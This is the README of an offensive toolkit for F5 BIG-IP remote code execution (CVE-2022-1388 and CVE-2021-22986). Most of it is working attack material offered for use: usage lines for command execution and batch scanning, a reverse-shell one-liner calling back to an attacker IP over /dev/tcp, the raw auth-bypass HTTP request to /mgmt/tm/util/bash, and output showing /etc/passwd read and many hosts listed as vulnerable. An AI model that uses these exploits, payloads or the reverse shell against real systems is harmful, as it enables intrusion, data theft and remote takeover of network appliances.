# 2022-2021-RCE
I modified it so you can use CVE-2022-1388/CVE-2021-22986 and F5 BIG-IP RCE vuln checks and exploiters
the normal check.py and exp.py is 2022 but CVE_2021, newpoc, and f5.rest.jar are from the 2021 version
Idk why but I added the CVE-2022-1388 REST Auth Bypass RCE

but all you gotta do is do python check.py to see all cmds

<strong>2021/CVE_2021 Basic use</strong>
```
python3 CVE_2021.py
```
```
Vuln check: python3 CVE_2021_.py -v true -u https://192.168.174.164
```
```
command execute: python3 CVE_2021.py -a true -u https://192.168.174.164 -c id
```
```
python3 CVE_2021.py -a true -u https://192.168.174.164 -c whoami
```
```
batch scan: python3 CVE_2021_.py -s true -f url.txt
```
```
Reserve Shell: python3 CVE_2021.py -r true -u https://192.168.174.164 -c "bash -i >&/dev/tcp/192.168.174.129/8888 0>&1"
```
```
New POC: python3 newpoc.py https://192.168.174.164
```
```
Validation mode：python CVE_2021.py -v true -u target_url 
```
```
Attack mode：python CVE_2021.py -a true -u target_url -c command 
```
```
Batch detection：python CVE_2021.py -s true -f file
```
```
Bounce mode：python CVE_2021.py -r true -u target_url -c command 
```
<strong>2022/Check.py Basic use</strong>

Vulnerability name: F5 BIG-IP iControl Rest API exposed Check

```
Function: single detection, batch detection    
```
```
Single detection：python exp.py -u url
```
```
Batch detection：python exp.py -f url.txt
```
```
Check: python check.py -f url.txt
```
<strong>2022/CVE-1388.py basic usage</strong>

this is the CVE-2022-1388 REST Auth Bypass RCE

```http
POST /mgmt/tm/util/bash HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host
Content-type: application/json
X-F5-Auth-Token: anything
Authorization: Basic YWRtaW46
Content-Length: 42

{"command": "run", "utilCmdArgs": "-c id"}
```

Vulnerability detection against a URL.

```bash
$ python CVE-2022-1388.py -u https://192.168.2.110
[+] https://192.168.2.110 is vulnerable!!!
```

Execute arbitrary commands.

```bash
$ python CVE-2022-1388.py -u https://192.168.2.110 -c 'cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
tmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin
admin:x:0:500:Admin User:/home/admin:/usr/bin/tmsh
qemu:x:107:107:qemu user:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
oprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin
syscheck:x:199:10::/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
f5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin
......
```

Read all URLs in the file and perform vulnerability detection.

```bash
$ python CVE-2022-1388.py -f urls.txt
[-] https://10.1.6.5 is not vulnerable.
[+] https://10.1.92.34 is vulnerable!!!
[+] https://10.2.124.144 is vulnerable!!!
[+] https://10.1.194.22 is vulnerable!!!
[+] https://10.2.21.132 is vulnerable!!!
[+] https://10.1.236.2 is vulnerable!!!
[+] https://10.3.155.2 is vulnerable!!!
[+] https://10.2.155.4 is vulnerable!!!
[+] https://10.3.151.92 is vulnerable!!!
[+] https://10.4.139.131 is vulnerable!!!
[+] https://10.7.226.141 is vulnerable!!!
[+] https://10.1.129.53 is vulnerable!!!
[+] https://10.9.45.2 is vulnerable!!!
[+] https://10.5.96.105 is vulnerable!!!
[+] https://10.3.156.6 is vulnerable!!!
$ cat success.txt
https://10.1.92.34
https://10.2.124.144
https://10.1.194.22
https://10.2.21.132
https://10.1.236.2
https://10.3.155.2
https://10.2.155.4
https://10.3.151.92
https://10.4.139.131
https://10.7.226.141
https://10.1.129.53
https://10.9.45.2
https://10.5.96.105
https://10.3.156.6
```
<strong>exp.py basic usage</strong>

```
       Validation mode：python CVE_2022.py -v true -u target_url 
       Attack mode：python CVE_2022.py -a true -u target_url -c command 
       Batch detection：python CVE_2022.py -s true -f file
       Bounce mode：python CVE_2022.py -r true -u target_url -c command 
      ================================================================
       Validation mode：python exp.py -v true -u target_url 
       Attack mode：python exp.py -a true -u target_url -c command 
       Batch detection：python exp.py -s true -f file
       Bounce mode：python exp.py -r true -u target_url -c command 
```
